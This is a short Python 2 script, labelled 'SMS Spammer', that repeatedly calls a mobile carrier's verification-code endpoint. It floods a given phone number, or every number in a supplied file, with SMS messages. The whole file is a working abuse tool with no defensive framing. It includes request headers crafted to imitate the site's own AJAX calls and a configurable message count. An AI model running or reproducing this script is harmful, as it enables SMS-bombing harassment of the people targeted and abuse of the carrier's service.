#!/usr/bin/python
#Twitter: https://twitter.com/KendoClaw1

import argparse
import requests
from time import sleep

print """
########################
#                      #
#    SMS Spammer       #
#                      #
#   By: KendoClaw1     #
#                      #
########################
"""
print "To stop the script Press CTRL + C"


parser = argparse.ArgumentParser(description="SMS Spammer By KendoClaw1")
parser.add_argument("-p", help="PhoneNumber to send SMS to.",metavar="PhoneNumber")
parser.add_argument("-n", help="Number of SMS's to send (Default = 20)",type=int,metavar="NumOfSMS")
parser.add_argument("-f", help="Load a list of numbers from a file to spam (Optional)",metavar="file.txt")
args = parser.parse_args()



if args.n:
	howmanysms= args.n
else:
	howmanysms = 20

def sendsms(number):
	url = "http://etisalat.eg/dashboard/verify/sendVerificationCode"
	params = {'dial':number,'lang':'ar'}
	headers = {'Host':'etisalat.eg','Content-Type':'application/json;charset=utf-8','X-TS-AJAX-Request':'True'}
	payload = {"dial":number,"lang":"ar","timeStamp":"timeStamp"}
	req = requests.post(url,params=params,headers=headers,json=payload)
	print req.status_code
	

def onenumber():
	print "Sending SMS's please wait"
	for x in range(0,howmanysms):
		sendsms(phonenumber)
		print "%s SMS's sent" % x
		#To slow down the requests to avoid crashing the server :)
		sleep(3)
	print "Sending Done."

def loadfromfile():
	with open(args.f,'r') as file:
		numbers = [l.strip() for l in file]
	for number in numbers:
		for x in range(0,howmanysms):
			sendsms(number)
			print "%s SMS's sent to %s" % (x,number)
			sleep(2)


try:
	if args.f:
		loadfromfile()
	elif args.p:
		phonenumber =  args.p
		onenumber()
	else:
		print "\nMissing Argument: Please Specify a Phone Number using -p\n"
except KeyboardInterrupt:
	print "\nDone"
